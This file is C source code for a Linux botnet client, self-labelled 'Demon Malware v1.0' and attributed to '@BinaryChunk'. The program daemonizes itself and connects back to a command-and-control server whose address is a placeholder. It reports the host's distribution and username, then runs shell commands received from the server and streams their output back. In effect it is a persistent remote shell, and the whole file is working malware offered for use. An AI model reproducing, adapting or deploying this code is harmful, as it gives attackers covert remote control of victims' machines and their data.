/* Author @BinaryChunk :) */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <wait.h>

#include <sys/socket.h>
#include <arpa/inet.h>

unsigned short demonPort = 80;
unsigned char *ipAddr = "127.0.0.1"; //The ip address of the C2 Server goes here
int demonSock = 0;


typedef struct host{
	char distro[0x10];
	char arch[0x10];
	char username[0x10];
} zombie_machine;


unsigned char *fdgets(unsigned char *buffer, unsigned int buffSize, int fd);
int initConnection();
int connectionTimeout(unsigned int sockfd, int timeout);
int sockPrintf(int sockfd, unsigned char *data);
unsigned char *getHostInformation();
int fdpopen(unsigned char *command, unsigned char *type);
int recvLine(int sockfd, unsigned char *buffer, int buffSize); //this is used to receive commands from the server :)


int recvLine(int sockfd, unsigned char *buffer, int buffSize){
	fd_set fdset;
	struct timeval tv;
	
	//set the buffer to zeros to removed data capture brefore
	memset(buffer, 0, buffSize);
	
	FD_ZERO(&fdset);
	FD_SET(sockfd, &fdset);
	
	tv.tv_sec = 12;
	tv.tv_usec = 0;
	
	int count = 0;
	if(select(sockfd + 1, &fdset, NULL, &fdset, &tv) <= 0){
		while(count < 5){
			FD_ZERO(&fdset);	
			FD_SET(sockfd, &fdset);
			
			tv.tv_usec = 0x0;
			tv.tv_sec = 6;
			
			sockPrintf(sockfd, "PING");
			if(select(sockfd+1, &fdset, NULL, &fdset, &tv) <= 0){
				count++;
				continue;
			}
			break;
		}
		if (count >= 5) return 0;
	}
	
	int ret = recv(sockfd, buffer, buffSize, 0);
	buffer[strcspn(buffer, "\n")] = 0x0;
	return ret;
}

int fdpopen(unsigned char *command, unsigned char *type){
	int pipefds[2]; pid_t pid;	
	if(pipe(pipefds)) return -1;
	
	pid = vfork();
	
	if (pid < 0){
		sockPrintf(demonSock, "vfork() 3RR0R..!");
		close(pipefds[0]);
		close(pipefds[1]);
		return -1;
	}
	
	if (!pid){
		if (*type == 'r'){
			close(pipefds[0]);
			dup2(pipefds[1], 1);
		}else{
			close(pipefds[1]);
			dup2(pipefds[0], 0);
		}	
		execl("/bin/sh", "sh", "-c", command, NULL);
		_exit(127);
		
	}

	if (*type == 'r') {
		close(pipefds[1]); 
		return pipefds[0];
	}else{
		close(pipefds[0]);
		return pipefds[1];
	}
}


unsigned char *fdgets(unsigned char *buffer, unsigned int buffSize, int fd){
	int got = 1, total = 0;
	while(got==1 && total < buffSize && *(buffer + total-1) != '\n'){
		got = read(fd, buffer + total, 1); total++;
	}
	buffer[strcspn(buffer, "\n")] = 0x0;
	return got == 0 ? NULL : buffer;
}

//this is used to send data to the server =)
int sockPrintf(int sockfd, unsigned char *data){
	unsigned int buff_size = 2048;
	unsigned char *buffer = (unsigned char *) malloc(buff_size);
	
	memset(buffer, 0, buff_size);
	strncpy(buffer, data, buff_size);
	
	
	buffer[strlen(buffer)] = '\n';
	int r = send(sockfd, buffer, strlen(buffer), MSG_NOSIGNAL);
	free(buffer);
	return r;
}


unsigned char *getHostInformation(void){
	zombie_machine machine;
	pid_t pid; int pipefds[2];
	char *buffer = (char *) malloc(1024);
	memset(buffer, 0, 1024);
	
	if (!(access("/usr/bin/apt", F_OK)))
		strcpy(machine.distro, "DEBIAN");
	else if (!access("/usr/bin/yum", F_OK))
		strcpy(machine.distro, "RED HAT");
	else
		strcpy(machine.distro, "UNKNOWN");
	strcpy(machine.arch, "x86_64");
	
	if (pipe(pipefds)){ fprintf(stderr, "Error creating pipe()"); _exit(-1);}
	pid = vfork();
	
	if(pid < 0){
		fprintf(stderr, "Error fork()");
		close(pipefds[0]); close(pipefds[1]);
		_exit(-1);
	}
	
	if (!pid){
		close(pipefds[0]);
		dup2(pipefds[1], 1);
		char *args[] = {"/usr/bin/whoami", NULL};
		execv(args[0], args);
		_exit(127);		
	}

	waitpid(pid, NULL, 0);
	close(pipefds[1]);
	
	read(pipefds[0], machine.username, sizeof(machine.username));
	machine.username[strcspn(machine.username, "\n")] = 0x0;	
	sprintf(buffer, "\nDemon Malware v1.0 [(os)->%s (username)->%s (arch)-> %s]",machine.distro, machine.username, machine.arch);
	return buffer;
}


int initConnection(){
	if (demonSock){ close(demonSock); demonSock = 0x0;}
	
	demonSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (demonSock < 0){fprintf(stderr, "Error creating socket()\n");_exit(-1);}
	
	int r = connectionTimeout(demonSock, 20);
	return r;
}


int connectionTimeout(unsigned int sockfd, int timeout){
	struct sockaddr_in addr;
	fd_set fdset; 
	struct timeval tv;
	int flags;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(demonPort);
	addr.sin_addr.s_addr = inet_addr(ipAddr);
	
	flags = fcntl(sockfd, F_GETFL);
	fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
	FD_ZERO(&fdset); FD_SET(sockfd, &fdset);	
	
	
	if((connect(sockfd, (struct sockaddr *)&addr, sizeof(addr))) < 0){
		if (errno == EINPROGRESS){
			tv.tv_sec = timeout;
			tv.tv_usec = 0;
	
			FD_ZERO(&fdset);
			FD_SET(sockfd, &fdset);
		
			if (select(sockfd + 1, NULL, &fdset, NULL, &tv) > 0){
				int error; socklen_t len = sizeof error;
				if ((getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &error, &len)) == 0){
					if (error) return -1;
				}else return -1;
			}else return -1;
		}else return -1;		
	}
		
	memset(&flags, 0, sizeof(int));
	flags = fcntl(sockfd, F_GETFL);
	fcntl(sockfd, F_SETFL, flags &(~O_NONBLOCK));
	return 1;
}


int main(int argc, char **argv){
	signal(SIGPIPE, SIG_IGN);
	daemon(1, 1);
	
	while(1){
		if (initConnection() < 0){
			sleep(5);
			fprintf(stderr, "Could not reach Server()...\n");
			continue;
		}
	
		unsigned char buffer[2048];
		int got = 0;
		
		//fprintf(stderr, "Clearing memory: %p\n", &buffer);	
		memset(buffer, 0, 2048);
		
		sockPrintf(demonSock, getHostInformation());
	
		while(1){
			if(!(recvLine(demonSock, buffer, 2048))){
				fprintf(stderr, "No response from server()\n");
				sleep(2);
				break;
			}
			
			if(strstr(buffer, "PONG") == (char *)buffer) continue;
			if(strstr(buffer, "PING") == (char *)buffer){
				sockPrintf(demonSock, "PONG");
				continue;
			}

			unsigned char *message = buffer;
			
			if(*message = '!'){
				unsigned char *needle = message + 1;
				
				while(*needle != ' ' && *needle != 0x0) needle++;
				if (*needle == 0x0) continue;
				*(needle) = 0x0;
				
				needle = message + 1;
				message = message + strlen(needle) + 2;
				
				unsigned char *command = message;
				while(*message != ' ' && *message != 0x0) message++;
				*message = 0x0;
				message++;
				
				
				if(strcmp(command, "sh") == 0){
					unsigned char commands[1024];
					if(strstr(message, "su") != NULL) continue;
					if(strstr(message, "sudo") != NULL) continue; //this will make the server client hang waiting for input

					sprintf(commands, "%s 2>&1", message);
					int fd = fdpopen(commands, "r");
					
					memset(commands, 0, 1024);
					while(fdgets(commands, 1024, fd) != NULL){
						sockPrintf(demonSock, commands);
						memset(commands, 0, 1024);
						sleep(1);
					}
					close(fd);
				}
				
				//kill switch used to just restart the connection	
				if(strcmp(command, "rst") == 0){
					break;
				}

			}else continue;
		}
	}
	return 0;
}
